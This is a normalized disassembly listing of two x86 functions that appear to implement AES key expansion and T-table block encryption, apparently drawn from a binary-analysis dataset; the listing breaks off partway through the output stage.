sub_401000
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
push ebx
push esi
xor esi esi
push edi
mov eax ecx
add edx 0x2
movzx edi [ edx ]
xor ecx ecx
mov ch [ edx - 0x2 ]
add edx 0x4
mov cl [ edx - 0x5 ]
shl ecx 0x8
or ecx edi
movzx edi [ edx - 0x3 ]
shl ecx 0x8
or ecx edi
mov [ eax + esi * 4 ] ecx
inc esi
cmp esi 0x8
jl r-xdata
add eax 0x4
mov [ ebp + 0x8 ] rw-data
mov edi [ eax + 0x18 ]
xor edx edx
mov ecx edi
shr ecx 0x10
movzx ecx cl
mov dh [ ecx + rw-data ]
mov ecx edi
shr ecx 0x8
movzx ecx cl
movzx ecx [ ecx + rw-data ]
xor edx ecx
movzx ecx [ eax + 0x18 ]
movzx ecx [ ecx + rw-data ]
shl edx 0x8
xor edx ecx
mov esi [ eax + 0x8 ]
shl edx 0x8
mov ecx edi
shr ecx 0x18
movzx ecx [ ecx + rw-data ]
xor edx ecx
xor edx [ eax - 0x4 ]
lea ebx [ eax + 0x20 ]
mov ecx edx
mov edx [ ebp + 0x8 ]
xor ecx [ edx ]
mov edx [ eax ]
xor edx ecx
mov [ eax + 0x1c ] ecx
mov ecx [ eax + 0x4 ]
xor ecx edx
xor esi ecx
mov [ eax + 0x24 ] ecx
mov [ ebx ] edx
xor edx edx
mov [ eax + 0x28 ] esi
mov ecx esi
shr ecx 0x18
mov dh [ ecx + rw-data ]
mov ecx esi
shr ecx 0x10
movzx ecx cl
movzx ecx [ ecx + rw-data ]
xor edx ecx
mov ecx esi
shr ecx 0x8
movzx ecx cl
movzx ecx [ ecx + rw-data ]
add [ ebp + 0x8 ] 0x4
shl edx 0x8
xor edx ecx
movzx ecx [ eax + 0x28 ]
movzx ecx [ ecx + rw-data ]
shl edx 0x8
xor ecx edx
xor ecx [ eax + 0xc ]
mov edx [ eax + 0x10 ]
xor edx ecx
mov [ eax + 0x2c ] ecx
mov ecx [ eax + 0x14 ]
xor ecx edx
mov [ eax + 0x34 ] ecx
xor ecx edi
cmp [ ebp + 0x8 ] rw-data
mov [ eax + 0x30 ] edx
mov [ eax + 0x38 ] ecx
mov eax ebx
jl r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
sub_401121
push ebp
mov ebp esp
sub esp 0x14
mov eax [ ebp + 0x8 ]
xor edx edx
mov dh [ eax ]
push ebx
push esi
movzx esi [ eax + 0x2 ]
xor ebx ebx
mov dl [ eax + 0x1 ]
mov bh [ eax + 0xc ]
push edi
shl edx 0x8
or edx esi
movzx esi [ eax + 0x3 ]
shl edx 0x8
or edx esi
xor edx [ ecx ]
movzx esi [ eax + 0x6 ]
mov [ ebp - 0x8 ] edx
xor edx edx
mov dh [ eax + 0x4 ]
mov bl [ eax + 0xd ]
mov dl [ eax + 0x5 ]
shl ebx 0x8
shl edx 0x8
or edx esi
movzx esi [ eax + 0x7 ]
shl edx 0x8
or edx esi
xor edx [ ecx + 0x4 ]
movzx esi [ eax + 0xa ]
mov [ ebp + 0x8 ] edx
xor edx edx
mov dh [ eax + 0x8 ]
mov dl [ eax + 0x9 ]
shl edx 0x8
or edx esi
movzx esi [ eax + 0xb ]
shl edx 0x8
or edx esi
xor edx [ ecx + 0x8 ]
mov edi edx
movzx edx [ eax + 0xe ]
movzx eax [ eax + 0xf ]
or ebx edx
mov edx [ ebp + 0x8 ]
shl ebx 0x8
or ebx eax
xor ebx [ ecx + 0xc ]
lea eax [ ecx + 0x10 ]
shr edx 0x10
movzx esi dl
mov ecx edi
shr ecx 0x8
movzx ecx cl
mov edx [ ecx * 4 + rw-data ]
xor edx [ esi * 4 + rw-data ]
mov ecx [ ebp - 0x8 ]
shr ecx 0x18
xor edx [ ecx * 4 + rw-data ]
movzx ecx bl
xor edx [ ecx * 4 + rw-data ]
mov ecx ebx
xor edx [ eax ]
shr ecx 0x8
movzx ecx cl
mov esi [ ecx * 4 + rw-data ]
mov ecx [ ebp + 0x8 ]
mov [ ebp - 0x14 ] edx
mov edx edi
shr edx 0x10
movzx edx dl
xor esi [ edx * 4 + rw-data ]
shr ecx 0x18
xor esi [ ecx * 4 + rw-data ]
movzx ecx [ ebp - 0x8 ]
xor esi [ ecx * 4 + rw-data ]
mov ecx ebx
xor esi [ eax + 0x4 ]
mov [ ebp - 0x10 ] edi
mov [ ebp - 0xc ] esi
shr ecx 0x10
movzx ecx cl
mov esi [ ecx * 4 + rw-data ]
mov ecx [ ebp - 0x8 ]
shr ecx 0x8
shr ebx 0x18
movzx ecx cl
shr edi 0x18
xor esi [ edi * 4 + rw-data ]
mov edx [ ebp - 0x14 ]
xor esi [ ecx * 4 + rw-data ]
mov ecx [ ebp + 0x8 ]
movzx edi cl
xor esi [ edi * 4 + rw-data ]
shr ecx 0x8
xor esi [ eax + 0x8 ]
push 0x10
mov [ ebp - 0x4 ] esi
movzx esi cl
mov ecx [ ebx * 4 + rw-data ]
xor ecx [ esi * 4 + rw-data ]
mov ebx [ ebp - 0x8 ]
shr ebx 0x10
movzx esi bl
xor ecx [ esi * 4 + rw-data ]
movzx esi [ ebp - 0x10 ]
xor ecx [ esi * 4 + rw-data ]
mov ebx [ ebp - 0x4 ]
xor ecx [ eax + 0xc ]
shr ebx 0x8
movzx esi bl
mov esi [ esi * 4 + rw-data ]
mov ebx [ ebp - 0xc ]
shr ebx 0x10
movzx ebx bl
xor esi [ ebx * 4 + rw-data ]
mov ebx edx
shr ebx 0x18
xor esi [ ebx * 4 + rw-data ]
movzx ebx cl
xor esi [ ebx * 4 + rw-data ]
pop edi
add eax edi
xor esi [ eax ]
mov ebx ecx
shr ebx 0x8
mov [ ebp - 0x8 ] esi
movzx esi bl
mov esi [ esi * 4 + rw-data ]
mov ebx [ ebp - 0x4 ]
shr ebx 0x10
movzx ebx bl
xor esi [ ebx * 4 + rw-data ]
mov ebx [ ebp - 0xc ]
shr ebx 0x18
xor esi [ ebx * 4 + rw-data ]
movzx ebx dl
xor esi [ ebx * 4 + rw-data ]
mov ebx ecx
xor esi [ eax + 0x4 ]
shr ebx 0x10
mov [ ebp + 0x8 ] esi
movzx esi bl
mov esi [ esi * 4 + rw-data ]
mov ebx [ ebp - 0x4 ]
shr ebx 0x18
xor esi [ ebx * 4 + rw-data ]
mov ebx edx
mov [ ebp - 0x10 ] esi
shr ebx 0x8
movzx esi bl
mov esi [ esi * 4 + rw-data ]
xor [ ebp - 0x10 ] esi
movzx ebx [ ebp - 0xc ]
mov esi [ ebp - 0x10 ]
xor esi [ ebx * 4 + rw-data ]
mov ebx [ ebp - 0xc ]
xor esi [ eax + 0x8 ]
shr ecx 0x18
shr ebx 0x8
mov [ ebp - 0x10 ] esi
movzx esi bl
mov ecx [ ecx * 4 + rw-data ]
xor ecx [ esi * 4 + rw-data ]
mov ebx [ ebp + 0x8 ]
shr edx 0x10
movzx edx dl
xor ecx [ edx * 4 + rw-data ]
movzx edx [ ebp - 0x4 ]
xor ecx [ edx * 4 + rw-data ]
mov edx [ ebp - 0x10 ]
xor ecx [ eax + 0xc ]
shr ebx 0x10
movzx esi bl
shr edx 0x8
movzx edx dl
mov edx [ edx * 4 + rw-data ]
xor edx [ esi * 4 + rw-data ]
mov esi [ ebp - 0x8 ]
shr esi 0x18
xor edx [ esi * 4 + rw-data ]
movzx esi cl
xor edx [ esi * 4 + rw-data ]
mov ebx ecx
shr ebx 0x8
movzx esi bl
mov esi [ esi * 4 + rw-data ]
mov ebx [ ebp - 0x10 ]
shr ebx 0x10
movzx ebx bl
xor esi [ ebx * 4 + rw-data ]
movzx ebx [ ebp - 0x8 ]
mov [ ebp - 0xc ] esi
mov esi [ ebp + 0x8 ]
shr esi 0x18
mov esi [ esi * 4 + rw-data ]
xor [ ebp - 0xc ] esi
mov esi [ ebp - 0xc ]
xor esi [ ebx * 4 + rw-data ]
add eax edi
xor esi [ eax + 0x4 ]
mov ebx ecx
shr ebx 0x10
mov [ ebp - 0xc ] esi
movzx esi bl
mov esi [ esi * 4 + rw-data ]
mov ebx [ ebp - 0x10 ]
shr ebx 0x18
xor esi [ ebx * 4 + rw-data ]
mov ebx [ ebp - 0x8 ]
shr ebx 0x8
mov [ ebp - 0x4 ] esi
movzx esi bl
mov esi [ esi * 4 + rw-data ]
xor [ ebp - 0x4 ] esi
movzx ebx [ ebp + 0x8 ]
mov esi [ ebp - 0x4 ]
xor esi [ ebx * 4 + rw-data ]
mov ebx [ ebp + 0x8 ]
xor esi [ eax + 0x8 ]
xor edx [ eax ]
shr ebx 0x8
mov [ ebp - 0x4 ] esi
movzx esi bl
mov ebx [ ebp - 0x8 ]
shr ecx 0x18
mov ecx [ ecx * 4 + rw-data ]
xor ecx [ esi * 4 + rw-data ]
shr ebx 0x10
movzx esi bl
xor ecx [ esi * 4 + rw-data ]
movzx esi [ ebp - 0x10 ]
xor ecx [ esi * 4 + rw-data ]
mov ebx [ ebp - 0x4 ]
xor ecx [ eax + 0xc ]
shr ebx 0x8
movzx esi bl
mov ebx [ ebp - 0xc ]
mov esi [ esi * 4 + rw-data ]
shr ebx 0x10
movzx ebx bl
add eax edi
xor esi [ ebx * 4 + rw-data ]
mov ebx edx
shr ebx 0x18
xor esi [ ebx * 4 + rw-data ]
movzx ebx cl
xor esi [ ebx * 4 + rw-data ]
mov ebx ecx
xor esi [ eax ]
shr ebx 0x8
mov [ ebp - 0x8 ] esi
movzx esi bl
mov esi [ esi * 4 + rw-data ]
mov ebx [ ebp - 0x4 ]
shr ebx 0x10
movzx ebx bl
xor esi [ ebx * 4 + rw-data ]
mov ebx [ ebp - 0xc ]
shr ebx 0x18
xor esi [ ebx * 4 + rw-data ]
movzx ebx dl
xor esi [ ebx * 4 + rw-data ]
mov ebx ecx
xor esi [ eax + 0x4 ]
shr ebx 0x10
mov [ ebp + 0x8 ] esi
movzx esi bl
mov esi [ esi * 4 + rw-data ]
mov ebx [ ebp - 0x4 ]
shr ebx 0x18
xor esi [ ebx * 4 + rw-data ]
mov ebx edx
mov [ ebp - 0x10 ] esi
shr ebx 0x8
movzx esi bl
mov esi [ esi * 4 + rw-data ]
xor [ ebp - 0x10 ] esi
movzx ebx [ ebp - 0xc ]
mov esi [ ebp - 0x10 ]
xor esi [ ebx * 4 + rw-data ]
mov ebx [ ebp - 0xc ]
xor esi [ eax + 0x8 ]
shr ebx 0x8
mov [ ebp - 0x10 ] esi
movzx esi bl
mov ebx [ ebp + 0x8 ]
shr edx 0x10
movzx edx dl
shr ecx 0x18
mov ecx [ ecx * 4 + rw-data ]
xor ecx [ esi * 4 + rw-data ]
shr ebx 0x10
xor ecx [ edx * 4 + rw-data ]
movzx edx [ ebp - 0x4 ]
xor ecx [ edx * 4 + rw-data ]
mov edx [ ebp - 0x10 ]
xor ecx [ eax + 0xc ]
shr edx 0x8
movzx esi bl
movzx edx dl
mov edx [ edx * 4 + rw-data ]
xor edx [ esi * 4 + rw-data ]
mov esi [ ebp - 0x8 ]
shr esi 0x18
xor edx [ esi * 4 + rw-data ]
movzx esi cl
xor edx [ esi * 4 + rw-data ]
mov ebx ecx
shr ebx 0x8
movzx esi bl
mov ebx [ ebp - 0x10 ]
mov esi [ esi * 4 + rw-data ]
shr ebx 0x10
movzx ebx bl
xor esi [ ebx * 4 + rw-data ]
movzx ebx [ ebp - 0x8 ]
mov [ ebp - 0xc ] esi
mov esi [ ebp + 0x8 ]
shr esi 0x18
mov esi [ esi * 4 + rw-data ]
add eax edi
xor edx [ eax ]
xor [ ebp - 0xc ] esi
mov esi [ ebp - 0xc ]
xor esi [ ebx * 4 + rw-data ]
mov ebx ecx
xor esi [ eax + 0x4 ]
shr ebx 0x10
mov [ ebp - 0xc ] esi
movzx esi bl
mov esi [ esi * 4 + rw-data ]
mov ebx [ ebp - 0x10 ]
shr ebx 0x18
xor esi [ ebx * 4 + rw-data ]
mov ebx [ ebp - 0x8 ]
shr ebx 0x8
mov [ ebp - 0x4 ] esi
movzx esi bl
mov esi [ esi * 4 + rw-data ]
xor [ ebp - 0x4 ] esi
movzx ebx [ ebp + 0x8 ]
mov esi [ ebp - 0x4 ]
xor esi [ ebx * 4 + rw-data ]
mov ebx [ ebp + 0x8 ]
xor esi [ eax + 0x8 ]
shr ebx 0x8
mov [ ebp - 0x4 ] esi
movzx esi bl
mov ebx [ ebp - 0x8 ]
shr ebx 0x10
shr ecx 0x18
mov ecx [ ecx * 4 + rw-data ]
xor ecx [ esi * 4 + rw-data ]
movzx esi bl
xor ecx [ esi * 4 + rw-data ]
movzx esi [ ebp - 0x10 ]
xor ecx [ esi * 4 + rw-data ]
mov ebx [ ebp - 0x4 ]
xor ecx [ eax + 0xc ]
shr ebx 0x8
movzx esi bl
mov esi [ esi * 4 + rw-data ]
mov ebx [ ebp - 0xc ]
shr ebx 0x10
movzx ebx bl
xor esi [ ebx * 4 + rw-data ]
mov ebx edx
shr ebx 0x18
xor esi [ ebx * 4 + rw-data ]
movzx ebx cl
xor esi [ ebx * 4 + rw-data ]
add eax edi
xor esi [ eax ]
mov ebx ecx
shr ebx 0x8
mov [ ebp - 0x8 ] esi
movzx esi bl
mov esi [ esi * 4 + rw-data ]
mov ebx [ ebp - 0x4 ]
shr ebx 0x10
movzx ebx bl
xor esi [ ebx * 4 + rw-data ]
mov ebx [ ebp - 0xc ]
shr ebx 0x18
xor esi [ ebx * 4 + rw-data ]
movzx ebx dl
xor esi [ ebx * 4 + rw-data ]
mov ebx ecx
xor esi [ eax + 0x4 ]
shr ebx 0x10
mov [ ebp + 0x8 ] esi
movzx esi bl
mov esi [ esi * 4 + rw-data ]
mov ebx [ ebp - 0x4 ]
shr ebx 0x18
xor esi [ ebx * 4 + rw-data ]
mov ebx edx
mov [ ebp - 0x10 ] esi
shr ebx 0x8
movzx esi bl
mov esi [ esi * 4 + rw-data ]
xor [ ebp - 0x10 ] esi
movzx ebx [ ebp - 0xc ]
mov esi [ ebp - 0x10 ]
xor esi [ ebx * 4 + rw-data ]
mov ebx [ ebp - 0xc ]
xor esi [ eax + 0x8 ]
shr ebx 0x8
mov [ ebp - 0x10 ] esi
movzx esi bl
mov ebx [ ebp + 0x8 ]
shr ecx 0x18
mov ecx [ ecx * 4 + rw-data ]
xor ecx [ esi * 4 + rw-data ]
shr edx 0x10
movzx edx dl
xor ecx [ edx * 4 + rw-data ]
movzx edx [ ebp - 0x4 ]
xor ecx [ edx * 4 + rw-data ]
mov edx [ ebp - 0x10 ]
xor ecx [ eax + 0xc ]
shr ebx 0x10
movzx esi bl
shr edx 0x8
movzx edx dl
mov edx [ edx * 4 + rw-data ]
xor edx [ esi * 4 + rw-data ]
mov esi [ ebp - 0x8 ]
shr esi 0x18
xor edx [ esi * 4 + rw-data ]
movzx esi cl
xor edx [ esi * 4 + rw-data ]
mov ebx ecx
shr ebx 0x8
movzx esi bl
mov esi [ esi * 4 + rw-data ]
mov ebx [ ebp - 0x10 ]
shr ebx 0x10
movzx ebx bl
xor esi [ ebx * 4 + rw-data ]
movzx ebx [ ebp - 0x8 ]
mov [ ebp - 0xc ] esi
mov esi [ ebp + 0x8 ]
shr esi 0x18
mov esi [ esi * 4 + rw-data ]
xor [ ebp - 0xc ] esi
mov esi [ ebp - 0xc ]
xor esi [ ebx * 4 + rw-data ]
add eax edi
xor esi [ eax + 0x4 ]
mov ebx ecx
shr ebx 0x10
mov [ ebp - 0xc ] esi
movzx esi bl
mov esi [ esi * 4 + rw-data ]
mov ebx [ ebp - 0x10 ]
shr ebx 0x18
xor esi [ ebx * 4 + rw-data ]
mov ebx [ ebp - 0x8 ]
mov [ ebp - 0x4 ] esi
shr ebx 0x8
movzx esi bl
mov esi [ esi * 4 + rw-data ]
xor [ ebp - 0x4 ] esi
movzx ebx [ ebp + 0x8 ]
mov esi [ ebp - 0x4 ]
xor esi [ ebx * 4 + rw-data ]
mov ebx [ ebp + 0x8 ]
xor esi [ eax + 0x8 ]
xor edx [ eax ]
shr ebx 0x8
shr ecx 0x18
mov ecx [ ecx * 4 + rw-data ]
mov [ ebp - 0x4 ] esi
movzx esi bl
xor ecx [ esi * 4 + rw-data ]
mov ebx [ ebp - 0x8 ]
shr ebx 0x10
movzx esi bl
xor ecx [ esi * 4 + rw-data ]
movzx esi [ ebp - 0x10 ]
xor ecx [ esi * 4 + rw-data ]
mov ebx [ ebp - 0x4 ]
xor ecx [ eax + 0xc ]
add eax edi
shr ebx 0x8
movzx esi bl
mov esi [ esi * 4 + rw-data ]
mov ebx [ ebp - 0xc ]
shr ebx 0x10
movzx ebx bl
xor esi [ ebx * 4 + rw-data ]
mov ebx edx
shr ebx 0x18
xor esi [ ebx * 4 + rw-data ]
movzx ebx cl
xor esi [ ebx * 4 + rw-data ]
mov ebx ecx
xor esi [ eax ]
shr ebx 0x8
mov [ ebp - 0x8 ] esi
movzx esi bl
mov esi [ esi * 4 + rw-data ]
mov ebx [ ebp - 0x4 ]
shr ebx 0x10
movzx ebx bl
xor esi [ ebx * 4 + rw-data ]
mov ebx [ ebp - 0xc ]
shr ebx 0x18
xor esi [ ebx * 4 + rw-data ]
movzx ebx dl
xor esi [ ebx * 4 + rw-data ]
mov ebx ecx
xor esi [ eax + 0x4 ]
shr ebx 0x10
mov [ ebp + 0x8 ] esi
movzx esi bl
mov esi [ esi * 4 + rw-data ]
mov ebx [ ebp - 0x4 ]
shr ebx 0x18
xor esi [ ebx * 4 + rw-data ]
mov ebx edx
mov [ ebp - 0x10 ] esi
shr ebx 0x8
movzx esi bl
mov esi [ esi * 4 + rw-data ]
xor [ ebp - 0x10 ] esi
movzx ebx [ ebp - 0xc ]
mov esi [ ebp - 0x10 ]
xor esi [ ebx * 4 + rw-data ]
mov ebx [ ebp - 0xc ]
xor esi [ eax + 0x8 ]
shr ebx 0x8
mov [ ebp - 0x10 ] esi
shr edx 0x10
movzx esi bl
mov ebx [ ebp + 0x8 ]
movzx edx dl
shr ecx 0x18
mov ecx [ ecx * 4 + rw-data ]
xor ecx [ esi * 4 + rw-data ]
shr ebx 0x10
xor ecx [ edx * 4 + rw-data ]
movzx edx [ ebp - 0x4 ]
xor ecx [ edx * 4 + rw-data ]
mov edx [ ebp - 0x10 ]
xor ecx [ eax + 0xc ]
shr edx 0x8
movzx edx dl
mov edx [ edx * 4 + rw-data ]
movzx esi bl
xor edx [ esi * 4 + rw-data ]
mov esi [ ebp - 0x8 ]
shr esi 0x18
xor edx [ esi * 4 + rw-data ]
movzx esi cl
xor edx [ esi * 4 + rw-data ]
mov ebx ecx
shr ebx 0x8
movzx esi bl
mov ebx [ ebp - 0x10 ]
mov esi [ esi * 4 + rw-data ]
add eax edi
xor edx [ eax ]
shr ebx 0x10
movzx ebx bl
xor esi [ ebx * 4 + rw-data ]
movzx ebx [ ebp - 0x8 ]
mov [ ebp - 0xc ] esi
mov esi [ ebp + 0x8 ]
shr esi 0x18
mov esi [ esi * 4 + rw-data ]
xor [ ebp - 0xc ] esi
mov esi [ ebp - 0xc ]
xor esi [ ebx * 4 + rw-data ]
mov ebx ecx
xor esi [ eax + 0x4 ]
shr ebx 0x10
mov [ ebp - 0xc ] esi
movzx esi bl
mov esi [ esi * 4 + rw-data ]
mov ebx [ ebp - 0x10 ]
shr ebx 0x18
xor esi [ ebx * 4 + rw-data ]
mov ebx [ ebp - 0x8 ]
shr ebx 0x8
mov [ ebp - 0x4 ] esi
movzx esi bl
mov esi [ esi * 4 + rw-data ]
xor [ ebp - 0x4 ] esi
movzx ebx [ ebp + 0x8 ]
mov esi [ ebp - 0x4 ]
xor esi [ ebx * 4 + rw-data ]
mov ebx [ ebp + 0x8 ]
xor esi [ eax + 0x8 ]
shr ebx 0x8
mov [ ebp - 0x4 ] esi
movzx esi bl
mov ebx [ ebp - 0x8 ]
shr ebx 0x10
shr ecx 0x18
mov ecx [ ecx * 4 + rw-data ]
xor ecx [ esi * 4 + rw-data ]
movzx esi bl
xor ecx [ esi * 4 + rw-data ]
movzx esi [ ebp - 0x10 ]
xor ecx [ esi * 4 + rw-data ]
mov ebx [ ebp - 0x4 ]
xor ecx [ eax + 0xc ]
shr ebx 0x8
movzx esi bl
mov esi [ esi * 4 + rw-data ]
mov ebx [ ebp - 0xc ]
shr ebx 0x10
movzx ebx bl
xor esi [ ebx * 4 + rw-data ]
mov ebx edx
shr ebx 0x18
xor esi [ ebx * 4 + rw-data ]
movzx ebx cl
xor esi [ ebx * 4 + rw-data ]
add eax edi
xor esi [ eax ]
mov ebx ecx
shr ebx 0x8
mov [ ebp - 0x8 ] esi
movzx esi bl
mov ebx [ ebp - 0x4 ]
mov esi [ esi * 4 + rw-data ]
shr ebx 0x10
movzx ebx bl
xor esi [ ebx * 4 + rw-data ]
mov ebx [ ebp - 0xc ]
shr ebx 0x18
xor esi [ ebx * 4 + rw-data ]
movzx ebx dl
xor esi [ ebx * 4 + rw-data ]
mov ebx ecx
xor esi [ eax + 0x4 ]
shr ebx 0x10
mov [ ebp + 0x8 ] esi
movzx esi bl
mov ebx [ ebp - 0x4 ]
mov esi [ esi * 4 + rw-data ]
shr ebx 0x18
xor esi [ ebx * 4 + rw-data ]
mov [ ebp - 0x10 ] esi
mov ebx edx
shr ebx 0x8
movzx esi bl
mov esi [ esi * 4 + rw-data ]
xor [ ebp - 0x10 ] esi
movzx ebx [ ebp - 0xc ]
mov esi [ ebp - 0x10 ]
xor esi [ ebx * 4 + rw-data ]
mov ebx [ ebp - 0xc ]
xor esi [ eax + 0x8 ]
shr ebx 0x8
mov [ ebp - 0x10 ] esi
movzx esi bl
mov ebx [ ebp + 0x8 ]
shr edx 0x10
shr ecx 0x18
mov ecx [ ecx * 4 + rw-data ]
xor ecx [ esi * 4 + rw-data ]
movzx edx dl
xor ecx [ edx * 4 + rw-data ]
movzx edx [ ebp - 0x4 ]
xor ecx [ edx * 4 + rw-data ]
mov edx [ ebp - 0x10 ]
xor ecx [ eax + 0xc ]
shr ebx 0x10
movzx esi bl
shr edx 0x8
movzx edx dl
mov edx [ edx * 4 + rw-data ]
xor edx [ esi * 4 + rw-data ]
mov esi [ ebp - 0x8 ]
shr esi 0x18
xor edx [ esi * 4 + rw-data ]
movzx esi cl
xor edx [ esi * 4 + rw-data ]
mov ebx ecx
shr ebx 0x8
movzx esi bl
mov esi [ esi * 4 + rw-data ]
mov ebx [ ebp - 0x10 ]
shr ebx 0x10
movzx ebx bl
xor esi [ ebx * 4 + rw-data ]
movzx ebx [ ebp - 0x8 ]
mov [ ebp - 0xc ] esi
mov esi [ ebp + 0x8 ]
shr esi 0x18
mov esi [ esi * 4 + rw-data ]
xor [ ebp - 0xc ] esi
mov esi [ ebp - 0xc ]
xor esi [ ebx * 4 + rw-data ]
add eax edi
xor esi [ eax + 0x4 ]
mov ebx ecx
shr ebx 0x10
mov [ ebp - 0xc ] esi
movzx esi bl
mov esi [ esi * 4 + rw-data ]
mov ebx [ ebp - 0x10 ]
shr ebx 0x18
xor esi [ ebx * 4 + rw-data ]
mov ebx [ ebp - 0x8 ]
xor edx [ eax ]
mov [ ebp - 0x4 ] esi
shr ebx 0x8
movzx esi bl
mov esi [ esi * 4 + rw-data ]
xor [ ebp - 0x4 ] esi
movzx ebx [ ebp + 0x8 ]
mov esi [ ebp - 0x4 ]
xor esi [ ebx * 4 + rw-data ]
mov ebx [ ebp + 0x8 ]
xor esi [ eax + 0x8 ]
shr ebx 0x8
shr ecx 0x18
mov ecx [ ecx * 4 + rw-data ]
mov [ ebp - 0x4 ] esi
movzx esi bl
mov ebx [ ebp - 0x8 ]
xor ecx [ esi * 4 + rw-data ]
shr ebx 0x10
movzx esi bl
xor ecx [ esi * 4 + rw-data ]
movzx esi [ ebp - 0x10 ]
xor ecx [ esi * 4 + rw-data ]
mov ebx [ ebp - 0x4 ]
xor ecx [ eax + 0xc ]
shr ebx 0x8
movzx esi bl
mov ebx [ ebp - 0xc ]
mov esi [ esi * 4 + rw-data ]
shr ebx 0x10
add eax edi
movzx edi bl
xor esi [ edi * 4 + rw-data ]
mov edi edx
shr edi 0x18
xor esi [ edi * 4 + rw-data ]
movzx edi cl
xor esi [ edi * 4 + rw-data ]
mov ebx ecx
shr ebx 0x8
movzx edi bl
mov edi [ edi * 4 + rw-data ]
mov ebx [ ebp - 0x4 ]
shr ebx 0x10
movzx ebx bl
xor edi [ ebx * 4 + rw-data ]
mov ebx [ ebp - 0xc ]
shr ebx 0x18
xor edi [ ebx * 4 + rw-data ]
movzx ebx dl
xor edi [ ebx * 4 + rw-data ]
mov ebx ecx
xor edi [ eax + 0x4 ]
shr ebx 0x10
mov [ ebp + 0x8 ] edi
movzx edi bl
mov edi [ edi * 4 + rw-data ]
mov ebx [ ebp - 0x4 ]
shr ebx 0x18
xor edi [ ebx * 4 + rw-data ]
mov ebx edx
shr ebx 0x8
movzx ebx bl
xor edi [ ebx * 4 + rw-data ]
movzx ebx [ ebp - 0xc ]
xor edi [ ebx * 4 + rw-data ]
mov ebx [ ebp - 0xc ]
xor edi [ eax + 0x8 ]
xor esi [ eax ]
shr edx 0x10
shr ebx 0x8
movzx edx dl
shr ecx 0x18
mov ecx [ ecx * 4 + rw-data ]
movzx ebx bl
xor ecx [ ebx * 4 + rw-data ]
mov ebx [ ebp + 0x8 ]
xor ecx [ edx * 4 + rw-data ]
movzx edx [ ebp - 0x4 ]
xor ecx [ edx * 4 + rw-data ]
mov edx edi
xor ecx [ eax + 0xc ]
shr edx 0x8
movzx edx dl
mov edx [ edx * 4 + rw-data ]
shr ebx 0x10
mov [ ebp - 0x10 ] edi
movzx edi bl
xor edx [ edi * 4 + rw-data ]
mov [ ebp - 0x8 ] esi
shr esi 0x18
xor edx [ esi * 4 + rw-data ]
movzx esi cl
xor edx [ esi * 4 + rw-data ]
add eax 0x10
xor edx [ eax ]
mov ebx ecx
shr ebx 0x8
movzx esi bl
mov ebx [ ebp - 0x10 ]
mov esi [ esi * 4 + rw-data ]
shr ebx 0x10
movzx edi bl
xor esi [ edi * 4 + rw-data ]
movzx edi [ ebp - 0x8 ]
mov [ ebp - 0xc ] esi
mov esi [ ebp + 0x8 ]
shr esi 0x18
mov esi [ esi * 4 + rw-data ]
xor [ ebp - 0xc ] esi
mov esi [ ebp - 0xc ]
xor esi [ edi * 4 + rw-data ]
mov ebx ecx
xor esi [ eax + 0x4 ]
mov edi [ ebp - 0x10 ]
shr ebx 0x10
mov [ ebp - 0xc ] esi
movzx esi bl
mov esi [ esi * 4 + rw-data ]
mov ebx [ ebp - 0x8 ]
shr ebx 0x8
shr ecx 0x18
shr edi 0x18
xor esi [ edi * 4 + rw-data ]
movzx edi [ ebp + 0x8 ]
mov [ ebp - 0x4 ] esi
movzx esi bl
mov esi [ esi * 4 + rw-data ]
xor [ ebp - 0x4 ] esi
mov esi [ ebp - 0x4 ]
xor esi [ edi * 4 + rw-data ]
mov ebx [ ebp + 0x8 ]
xor esi [ eax + 0x8 ]
shr ebx 0x8
movzx edi bl
mov [ ebp - 0x4 ] esi
mov esi [ ecx * 4 + rw-data ]
mov ecx [ ebp - 0x8 ]
xor esi [ edi * 4 + rw-data ]
shr ecx 0x10
movzx ecx cl
xor esi [ ecx * 4 + rw-data ]
movzx ecx [ ebp - 0x10 ]
xor esi [ ecx * 4 + rw-data ]
mov ecx [ ebp - 0xc ]
xor esi [ eax + 0xc ]
shr ecx 0x18
xor ebx ebx
mov bh [ ecx + rw-data ]
mov ecx [ ebp - 0x4 ]
shr ecx 0x10
movzx ecx cl
movzx ecx [ ecx + rw-data ]
xor ebx ecx
mov ecx esi
shr ecx 0x8
movzx ecx cl
movzx ecx [ ecx + rw-data ]
shl ebx 0x8
xor ebx ecx
shl ebx 0x8
movzx ecx dl
movzx ecx [ ecx + rw-data ]
xor ebx ecx
xor ebx [ eax + 0x14 ]
add eax 0x10
mov [ ebp + 0x8 ] ebx
xor ebx ebx
mov ecx esi
shr ecx 0x18
mov bh [ ecx + rw-data ]
mov ecx edx
shr ecx 0x10
movzx ecx cl
movzx ecx [ ecx + rw-data ]
xor ebx ecx
mov ecx [ ebp - 0xc ]
shl ebx 0x8
shr ecx 0x8
mov [ ebp - 0x8 ] esi
movzx ecx cl
movzx ecx [ ecx + rw-data ]
xor ebx ecx
movzx ecx [ ebp - 0x4 ]
movzx ecx [ ecx + rw-data ]
shl ebx 0x8
xor ebx ecx
xor ebx [ eax + 0xc ]
mov ecx [ ebp - 0x4 ]
shr ecx 0x18
mov [ ebp - 0x14 ] ebx
xor ebx ebx
mov bh [ ecx + rw-data ]
mov ecx esi
shr ecx 0x10
movzx ecx cl
movzx ecx [ ecx + rw-data ]
xor ebx ecx
mov ecx edx
shr ecx 0x8
movzx ecx cl
movzx ecx [ ecx + rw-data ]
shl ebx 0x8
xor ebx ecx
mov ecx [ ebp - 0xc ]
movzx esi cl
movzx esi [ esi + rw-data ]
shl ebx 0x8
shr edx 0x18
xor ebx esi
xor ebx [ eax + 0x8 ]
shr ecx 0x10
mov [ ebp - 0x10 ] ebx
xor ebx ebx
mov bh [ edx + rw-data ]
movzx ecx cl
movzx ecx [ ecx + rw-data ]
xor ebx ecx
mov ecx [ ebp - 0x4 ]
shr ecx 0x8
movzx ecx cl
movzx ecx [ ecx + rw-data ]
shl ebx 0x8
xor ebx ecx
movzx ecx [ ebp - 0x8 ]
movzx ecx [ ecx + rw-data ]
shl ebx 0x8
xor ebx ecx
xor ebx [ eax ]
mov eax [ ebp + 0xc ]
mov ecx ebx
mov edx ecx
shr edx 0x18
mov [ eax ] dl
mov edx ecx
shr edx 0x10
mov [ eax + 0x1 ] dl
mov edx ecx
shr edx 0x8
mov [ eax + 0x2 ] dl
mov [ eax + 0x3 ] cl
mov ecx [ ebp + 0x8 ]
mov edx ecx
shr edx 0x18
mov [ eax + 0x4 ] dl
